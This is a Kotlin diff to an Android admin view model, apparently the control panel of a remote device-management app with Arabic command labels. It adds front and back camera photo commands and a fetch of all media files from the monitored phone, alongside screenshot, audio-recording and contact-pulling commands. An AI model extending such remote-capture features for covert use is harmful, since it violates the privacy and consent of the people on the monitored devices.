@@ -86,6 +86,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     private val _audioRecords = MutableStateFlow<List<MediaItem>>(emptyList())
     val audioRecords: StateFlow<List<MediaItem>> = _audioRecords.asStateFlow()
 
+    private val _allMediaFiles = MutableStateFlow<List<MediaItem>>(emptyList())
+    val allMediaFiles: StateFlow<List<MediaItem>> = _allMediaFiles.asStateFlow()
+
     private val _contacts = MutableStateFlow<List<Contact>>(emptyList())
     val contacts: StateFlow<List<Contact>> = _contacts.asStateFlow()
 
@@ -654,6 +657,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         // 7. Fetch Audio Records
         _audioRecords.value = connector.getAudioRecords(token)
 
+        _allMediaFiles.value = connector.getAllMediaFiles(token)
+
         // 8. Get last command response
         _commandResponse.value = connector.getCommandResponse(token)
 
@@ -712,6 +717,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             "unlock_device" -> "إلغاء قفل الهاتف"
             "take_screenshot" -> "التقاط لقطة شاشة"
             "take_photo" -> "التقاط صورة كاميرا"
+            "take_photo_front" -> "التقاط صورة كاميرا أمامية"
+            "take_photo_back" -> "التقاط صورة كاميرا خلفية"
             "record_audio" -> "تسجيل صوتي"
             "get_contacts" -> "جلب جهات الاتصال"
             "play_remote_sound" -> "تشغيل صوت تنبيه"
@@ -892,7 +899,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                                 val currentScreenshot = _screenshots.value.firstOrNull() { it.timestamp > preScreenshotTime }
                                 _activeCommandProgress.value = _activeCommandProgress.value?.copy(responseData = currentScreenshot)
                             }
-                            "take_photo" -> {
+                            "take_photo", "take_photo_front", "take_photo_back" -> {
                                 val currentPhoto = _cameraPhotos.value.firstOrNull() { it.timestamp > prePhotoTime }
                                 _activeCommandProgress.value = _activeCommandProgress.value?.copy(responseData = currentPhoto)
                             }
@@ -931,7 +938,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                             _directScreenshotToShow.value = screenshotMedia
                         }
                     }
-                    "take_photo" -> {
+                    "take_photo", "take_photo_front", "take_photo_back" -> {
                         _cameraPhotos.value.firstOrNull()?.let { photoMedia ->
                             _directPhotoToShow.value = photoMedia
                         }
@@ -958,11 +965,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     fun requestPhoto(frontCamera: Boolean) {
-        val cameraParam = if (frontCamera) "front" else "back"
-        runCommand("take_photo", mapOf(
-            "camera" to cameraParam,
-            "isFront" to frontCamera
-        ))
+        val command = if (frontCamera) "take_photo_front" else "take_photo_back"
+        runCommand(command)
     }
 
     fun requestVideo(isFront: Boolean) {
